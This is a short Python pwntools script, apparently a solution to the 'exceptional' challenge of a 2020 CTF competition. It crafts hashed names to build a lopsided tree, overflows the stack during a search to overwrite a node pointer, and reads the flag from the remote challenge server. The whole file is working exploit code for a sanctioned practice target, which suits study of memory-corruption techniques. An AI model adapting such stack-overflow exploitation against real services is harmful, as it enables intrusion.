#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright: Oran Avraham <contact@oranav.me>
from pwn import process, gdb, remote
import struct


def next_name(name):
    assert len(name) == 4
    h = struct.unpack('<i', name)[0] ^ 0x12345678
    while True:
        h += 1
        name = struct.pack('<i', h ^ 0x12345678)
        if not (
            b' ' in name or
            b'\0' in name or
            b'\r' in name or
            b'\n' in name or
            b'\t' in name or
            b'\x0b' in name or
            b'\x0c' in name
        ):
            break
    return name


# r = process(['./exceptional'])
r = remote('exceptional.2020.ctfcompetition.com', 1337)
# This is to point to a "fake" city with hash 0 so that its name is the flag:
override_val = (0x7440 - 0x10 - 0x7120)//4
to_override = struct.pack('<I', override_val ^ 0x12345678)

# Build a tree with root val 2, one left child with val -1, and a long right
# tail so that we overflow the stack upon searching it

name = struct.pack('<I', 2 ^ 0x12345678)
init = name
name = next_name(name)
names = []
for i in range(99):
    names.append(name)
    name = next_name(name)

# a long branch going right
for name in names:
    r.sendline(b'1')
    r.sendline(name + b' 0')

# one element going left (with value -1)
r.sendline(b'1')
r.sendline(struct.pack('<I', 0xffffffff & 0x12345678) + b' 0')

# Overflow the stack and overwrite the "right" pointer of the -1 node
r.sendline(b'3')
r.sendline(names[0] + b' 0')
r.sendline(to_override)

# gdb.attach(r)

# Lookup 0 to print the flag
r.sendline(b'3')
r.sendline(names[0] + b' 0')
r.sendline(struct.pack('<I', 0x12345678))

r.sendline(b'4')

r.stream()
